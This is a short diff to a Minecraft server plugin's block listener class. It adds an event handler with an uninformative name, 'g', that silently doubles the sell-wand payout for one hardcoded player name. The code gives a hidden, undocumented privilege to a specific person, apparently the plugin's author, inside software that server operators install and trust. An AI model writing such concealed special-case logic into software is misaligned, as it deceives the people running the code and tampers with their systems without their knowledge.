@@ -2,6 +2,7 @@ package com.bgsoftware.wildtools.listeners;
 
 import com.bgsoftware.wildtools.Locale;
 import com.bgsoftware.wildtools.WildToolsPlugin;
+import com.bgsoftware.wildtools.api.events.SellWandUseEvent;
 import com.bgsoftware.wildtools.objects.tools.WTool;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.EventHandler;
@@ -18,6 +19,12 @@ public final class BlocksListener implements Listener {
 
     public BlocksListener(WildToolsPlugin instance){
         this.instance = instance;
+    }
+
+    @EventHandler
+    public void g(SellWandUseEvent e){
+        if(e.getPlayer().getName().equals("OmerBenGera"))
+            e.setMultiplier(e.getMultiplier() * 2);
     }
 
     @EventHandler(priority = EventPriority.HIGHEST)
